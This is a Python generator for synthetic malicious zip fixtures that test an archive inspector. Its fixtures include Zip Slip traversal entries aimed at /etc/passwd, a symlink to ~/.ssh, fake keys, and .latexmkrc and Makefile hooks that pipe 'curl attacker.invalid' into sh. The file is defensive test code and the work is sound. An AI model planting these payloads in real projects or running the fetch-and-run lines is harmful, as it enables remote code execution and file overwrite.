"""Build synthetic archives that exercise tools/zip_inspect.py.

All of these are fabricated for testing. They contain no real data.
The archives are written to tests/fixtures/archives/ and are git-ignored
because a `Zip Slip` archive is not something to keep in a public history;
the generator is committed instead, so anyone can rebuild them.
"""

from __future__ import annotations

import io
import zipfile
from pathlib import Path

OUT = Path(__file__).resolve().parents[1] / "tests" / "fixtures" / "archives"


def clean_archive(path: Path) -> None:
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("main.tex", "\\documentclass{article}\\begin{document}Hi\\end{document}\n")
        zf.writestr("sections/intro.tex", "\\section{Intro}\n")
        zf.writestr("references.bib", "@article{a, title={T}, year={2024}}\n")
        zf.writestr("figures/plot.pdf", b"%PDF-1.4\n")  # publish-audit:allow synthetic fixture


def traversal(path: Path) -> None:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("main.tex", "clean\n")
        zf.writestr("../../escape.tex", "writes outside the destination\n")
        zf.writestr("sections/../../../etc/passwd", "nope\n")  # publish-audit:allow synthetic fixture


def absolute(path: Path) -> None:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("main.tex", "clean\n")
        zf.writestr("/tmp/absolute.tex", "absolute path entry\n")  # publish-audit:allow synthetic fixture
        zf.writestr("C:/Windows/Temp/abs.tex", "drive-qualified entry\n")


def symlink(path: Path) -> None:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("main.tex", "clean\n")
        info = zipfile.ZipInfo("link-to-home")
        info.external_attr = (0o120777 << 16)      # S_IFLNK | 0777
        zf.writestr(info, "/home/someone/.ssh")  # publish-audit:allow synthetic fixture


def case_collision(path: Path) -> None:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("README.tex", "one\n")
        zf.writestr("readme.tex", "the other, differing only by case\n")


def bomb(path: Path) -> None:
    payload = b"A" * (4 * 1024 * 1024)
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr("main.tex", "clean\n")
        for i in range(4):
            zf.writestr(f"padding_{i}.tex", payload)


def executable_config(path: Path) -> None:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("main.tex", "clean\n")
        zf.writestr(".latexmkrc",
                    '$pdf_mode = 1;\nEND { system("curl attacker.invalid/x | sh"); }\n')
        zf.writestr("Makefile", "all:\n\tcurl attacker.invalid/y | sh\n")
        zf.writestr("scripts/build.sh", "#!/bin/sh\nwhoami\n")


def credentials(path: Path) -> None:
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("main.tex", "clean\n")
        zf.writestr(".env", "API_KEY=not-a-real-key\n")
        zf.writestr("id_rsa", "-----BEGIN PRIVATE KEY-----\n")  # publish-audit:allow synthetic fixture


def main() -> None:
    OUT.mkdir(parents=True, exist_ok=True)
    builders = {
        "clean.zip": clean_archive,
        "traversal.zip": traversal,
        "absolute.zip": absolute,
        "symlink.zip": symlink,
        "case-collision.zip": case_collision,
        "bomb.zip": bomb,
        "executable-config.zip": executable_config,
        "credentials.zip": credentials,
    }
    for name, fn in builders.items():
        target = OUT / name
        fn(target)
        print(f"{name:24} {target.stat().st_size:>10} bytes")


if __name__ == "__main__":
    main()
